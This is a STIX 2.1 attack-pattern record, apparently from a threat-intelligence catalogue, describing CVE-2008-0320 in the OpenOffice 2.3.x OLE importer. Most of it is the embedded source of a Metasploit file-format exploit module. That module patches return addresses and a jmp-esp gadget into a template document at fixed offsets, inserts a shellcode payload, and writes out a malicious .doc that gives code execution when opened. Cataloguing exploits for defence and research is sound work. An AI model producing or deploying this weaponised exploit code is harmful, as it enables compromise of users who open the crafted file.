{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6a7e43b5-fcfa-46e1-a18c-7f74ffd6bb6c",
    "created": "2024-08-14T16:36:47.400233Z",
    "modified": "2024-08-14T16:36:47.400237Z",
    "name": "\"OpenOffice OLE Importer DocumentSummaryInformation Stream Handling Overflow\"",
    "description": " This module exploits a vulnerability in OpenOffice 2.3.1 and 2.3.0 on Microsoft Windows XP SP3.  By supplying a OLE file with a malformed DocumentSummaryInformation stream, an attacker can gain control of the execution flow, which results arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/openoffice_ole.rb",
            "external_id": "openoffice_ole.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-0320"
        },
        {
            "source_name": "reference",
            "url": "http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=694"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"OpenOffice OLE Importer DocumentSummaryInformation Stream Handling Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability in OpenOffice 2.3.1 and 2.3.0 on\n        Microsoft Windows XP SP3.\n\n        By supplying a OLE file with a malformed DocumentSummaryInformation stream, an\n        attacker can gain control of the execution flow, which results arbitrary code\n        execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Marsu <Marsupilamipowa[at]hotmail.fr>', # Vulnerability discovery and PoC\n          'juan vazquez'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2008-0320'],\n          ['OSVDB', '44472'],\n          ['BID', '28819'],\n          ['EDB', '5584'],\n          ['URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=694']\n        ],\n      'Payload'        =>\n        {\n          'Space' => 407\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'          => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'OpenOffice 2.3.1 / 2.3.0 on Windows XP SP3',\n            {\n              'Ret' => 0x609345fe, # add esp, ebx # ... # ret from tl680mi\n              'EBX' => 0xffffefa8, # EBX value\n              'JmpEsp' => 0x60915cbd, # push esp # ret from tl680mi\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2008-04-17',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [true, 'The filename', 'msf.doc'])\n        ])\n  end\n\n  def exploit\n\n    path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2008-0320.doc')\n    f = File.open(path, 'rb')\n    template = f.read\n    f.close\n\n    my_payload = payload.encoded\n    template[115717, 4] = [target['Ret']].pack(\"V\")\n    template[115725, 4] = [target['EBX']].pack(\"V\")\n    template[115729, 4] = [target['JmpEsp']].pack(\"V\")\n    template[115808, my_payload.length] = my_payload\n    file_create(template)\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2008-04-17",
    "x_mitre_platforms": [
        "win'"
    ]
}